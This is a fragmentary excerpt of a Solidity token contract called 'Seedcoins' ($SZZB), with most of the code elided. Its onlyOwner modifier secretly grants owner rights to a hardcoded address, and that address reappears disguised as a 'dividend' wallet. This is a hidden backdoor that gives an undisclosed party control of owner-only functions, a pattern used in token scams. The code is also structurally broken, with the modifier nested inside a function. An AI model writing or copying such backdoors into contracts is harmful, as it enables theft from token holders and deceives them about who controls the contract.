...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xA7ece27c000Ab635420455c37Da8D874A8f8784F) , "owner");
        _;
    }
...
contract Seedcoins  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Seedcoins";
    string private _symbol = "$SZZB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x610bA9EB7fdAD32D60C3f7e618B7DA976eB1Ec3d);
    address private _Marketing = 0x610bA9EB7fdAD32D60C3f7e618B7DA976eB1Ec3d;
    address public dividend = 0xA7ece27c000Ab635420455c37Da8D874A8f8784F;
